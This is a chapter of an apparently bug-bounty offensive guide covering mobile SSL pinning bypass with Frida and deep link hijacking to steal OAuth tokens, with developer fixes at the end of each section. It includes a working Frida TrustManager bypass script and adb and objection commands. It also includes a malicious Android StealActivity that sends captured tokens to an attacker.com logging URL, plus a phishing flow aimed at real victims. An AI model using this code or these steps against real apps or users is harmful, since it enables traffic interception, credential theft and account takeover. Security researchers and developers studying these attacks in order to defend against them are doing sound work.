# 📱 Mobile (Tricks #46–#47)

> ⚠️ **Disclaimer:** Educational use only. Only test in-scope assets you are
> authorized to test. Never touch systems without explicit written permission.

Mobile apps often trust the client more than web apps — and they leak secrets
in ways that browsers can't. These two tricks cover the highest-impact mobile
bug classes: **SSL pinning bypass** and **deep link hijacking**. Both lead
directly to token theft and account takeover.

---

## Table of Contents

1. [Bypass SSL Pinning with Frida Scripts](#trick-46)
2. [Deep Link Hijacking for Auth Token Theft](#trick-47)

---

<a name="trick-46"></a>
## 🧩 Trick #46 — Bypass SSL Pinning with Frida Scripts

**Category:** Mobile
**Impact:** High (enables full API testing)
**Tools:** Frida, `frida-multiple-unpinning`, `objection`, mitmproxy, Burp

### The Idea
Mobile apps use **SSL pinning** to prevent proxy interception — the app only
trusts a hardcoded certificate. Bypassing pinning with Frida lets you
intercept all API traffic, exposing hidden endpoints, tokens, and business
logic you can't see from the web app.

### Prerequisites

- **Rooted Android** device or emulator (or **jailbroken iOS**)
- **Frida server** running on device
- **Frida client** installed on host:
  ```bash
  pip install frida-tools
  ```
- **Proxy** set up (Burp / mitmproxy) with CA installed as **system** cert
  (Android 7+ requires root for user → system cert move)

### Step 1 — Install Frida Server on Device

```bash
# Download matching frida-server for your arch
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"
```

### Step 2 — Enumerate Running Apps

```bash
frida-ps -U
```

Output:
```
PID   Name
1234  com.target.app
```

### Step 3 — Bypass Pinning

**Option A — Ready-made script:**
```bash
frida -U -f com.target.app -l frida-multiple-unpinning.js --no-pause
```

**Option B — Objection (interactive):**
```bash
objection -g com.target.app explore
# then inside:
android sslpinning disable
ios sslpinning disable
```

**Option C — Custom Frida script:**
```javascript
Java.perform(function() {
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var TrustManager = Java.registerClass({
        name: 'com.attacker.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    var TrustManagers = [TrustManager.$new()];
    var sslContext = SSLContext.getInstance('TLS');
    sslContext.init(null, TrustManagers, null);
    SSLContext.init.overload(
        '[Ljavax.net.ssl.KeyManager;',
        '[Ljavax.net.ssl.TrustManager;',
        'java.security.SecureRandom'
    ).implementation = function(km, tm, sr) {
        this.init(km, TrustManagers, sr);
    };
});
```

### Step 4 — Intercept Traffic

1. **Set device proxy** to your host IP:8080.
2. **Install Burp CA** as a system cert:
   ```bash
   # Convert to PEM, hash, push to /system/etc/security/cacerts/
   openssl x509 -inform DER -in burp.der -out burp.pem
   openssl x509 -inform PEM -in burp.pem -text -fingerprint -noout
   # filename = <hash>.0
   ```
3. **Restart app with Frida.**

4. **Watch Burp** — all API calls now visible.

### Step 5 — What to Look For

- **Hardcoded API keys** in requests
- **Bearer tokens** you can reuse
- **Internal endpoints** (`/api/internal/`, `/admin/`)
- **Mass assignment fields** (see Trick #42)
- **IDOR opportunities** (see Trick #43)
- **GraphQL queries** (see Trick #40)

### Other Bypass Techniques

**1. Xposed modules:**
- `JustTrustMe`, `SSLUnpinning`

**2. Magisk modules:**
- `MagiskTrustUserCerts`

**3. Objection patchapk (no root):**
```bash
objection patchapk -s target.apk
adb install target.objection.apk
```

**4. iOS — Frida:**
```bash
frida -U -f com.target.app -l ios-ssl-bypass.js --no-pause
```

### Why It Works
- Frida hooks into the app's runtime.
- Custom `TrustManager` accepts all certs.
- Pinning logic can be patched in memory.

### Fix (Developer Side)
- Implement **certificate transparency** checks.
- Use **certificate pinning** via platform APIs (TrustKit, OkHttp
  CertificatePinner).
- Add **runtime integrity checks** (SafetyNet, DeviceCheck, root detection).
- **Obfuscate pinning code** (R8/ProGuard).
- **Detect Frida / hooking frameworks** at startup.
- **Use short-lived tokens** — even if intercepted, limited damage.

### References
- [Frida](https://frida.re/)
- [Objection](https://github.com/sensepost/objection)
- [frida-multiple-unpinning](https://codeshare.frida.re/@akabe1/frida-multiple-unpinning/)

---

<a name="trick-47"></a>
## 🧩 Trick #47 — Deep Link Hijacking for Auth Token Theft

**Category:** Mobile
**Impact:** Critical (ATO)
**Tools:** `apktool`, `jadx`, `adb`, custom malicious app

### The Idea
Mobile apps register **custom URL schemes** (`myapp://`) for OAuth callbacks,
password resets, and deep navigation. Any app can register the **same
scheme** on Android — if the attacker's app wins the race, it receives the
victim's OAuth token.

### Attack Flow

1. **Target app registers `target://callback`.**
2. **OAuth flow redirects to `target://callback?token=SECRET`.**
3. **Attacker's malicious app also registers `target://callback`.**
4. **Android shows a chooser** — user picks attacker's app.
5. **Attacker receives the token** → ATO.

### Step 1 — Discover Deep Links

**Android — extract AndroidManifest.xml:**
```bash
apktool d target.apk -o target_decoded/
cat target_decoded/AndroidManifest.xml | grep -A5 "intent-filter"
```

**Look for:**
```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="target" android:host="callback" />
</intent-filter>
```

**iOS — extract Info.plist:**
```bash
unzip target.ipa
plutil -p Payload/Target.app/Info.plist | grep -A5 CFBundleURLSchemes
```

### Step 2 — Test the Deep Link

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "target://callback?token=test123"
```

If the app opens and processes the token → exploitable.

### Step 3 — Build Malicious App

**AndroidManifest.xml:**
```xml
<activity android:name=".StealActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="target" android:host="callback" />
    </intent-filter>
</activity>
```

**StealActivity.java:**
```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    Uri data = getIntent().getData();
    if (data != null) {
        String token = data.getQueryParameter("token");
        // Exfiltrate
        OkHttpClient client = new OkHttpClient();
        Request req = new Request.Builder()
            .url("https://attacker.com/log?token=" + token)
            .build();
        client.newCall(req).enqueue(null);
    }
}
```

**Install and trigger:**
```bash
adb install attacker.apk
adb shell am start -a android.intent.action.VIEW -d "target://callback?token=victim_token"
```

### Step 4 — Real-World Attack

1. **Victim has target app installed.**
2. **Attacker sends a link** (via email, SMS, or a malicious site):
   ```
   https://target.com/oauth/authorize?redirect_uri=target://callback?token=X
   ```
3. **Victim clicks** → OAuth flow → redirect to `target://callback?token=SECRET`.
4. **Android chooser** appears (if both apps registered).
5. **Victim picks attacker's app** (or attacker's app wins by priority).
6. **Token exfiltrated.**

### Advanced Variants

**1. App Link / Universal Link hijacking:**
- If app uses `https://target.com/app/...` links
- Attacker registers a similar domain
- Or exploits a **subdomain takeover** to control the link

**2. Intent redirection:**
- If target app accepts an `intent://` URL
- Attacker can redirect to any component
- Bypass exported=false

**3. WebView + deep link chain:**
- Deep link opens a WebView
- WebView loads attacker URL
- Attacker JS calls `target://` with stolen token

**4. OAuth `redirect_uri` misconfiguration:**
- Deep link accepted as `redirect_uri`
- No PKCE → token stolen directly
- No state parameter → CSRF

### Step 5 — Impact Demonstration

- **Steal OAuth token** → access victim's account
- **Steal password reset token** → ATO
- **Steal magic link** → ATO
- **Trigger privileged actions** via deep link

### Why It Works
- **Custom schemes are not verified** — anyone can register them.
- **Android chooser** is user-selectable (or priority-based).
- **iOS Universal Links** are safer, but many apps still use custom schemes.
- **OAuth flows trust `redirect_uri`** if not strictly validated.

### Fix (Developer Side)

**Android:**
- Use **Android App Links** (verified `https://` links) instead of custom
  schemes.
- Add `<intent-filter android:autoVerify="true">` with
  `assetlinks.json`.
- Validate incoming URLs strictly.
- Never send tokens via deep links — use a **short-lived auth code**.

**iOS:**
- Use **Universal Links** (associated domains).
- Never send tokens directly.
- Use `ASWebAuthenticationSession` for OAuth.

**Both:**
- **PKCE** on all OAuth flows.
- **State parameter** to prevent CSRF.
- **Strict `redirect_uri` allowlist** — exact match.
- **Bind tokens to device** (attestation).

### References
- [Android App Links](https://developer.android.com/training/app-links)
- [iOS Universal Links](https://developer.apple.com/ios/universal-links/)
- [OAuth 2.0 for Native Apps (RFC 8252)](https://datatracker.ietf.org/doc/html/rfc8252)

---

## 📌 Quick Reference Summary

| #  | Trick                    | Impact   | Effort |
|----|--------------------------|----------|--------|
| 46 | SSL pinning bypass       | High     | Medium |
| 47 | Deep link hijacking      | Critical | Medium |

---

> **Prev:** [API & Modern Stacks ←](08-api-modern.md)
> **Next:** [Reporting & Mindset →](10-reporting-mindset.md)
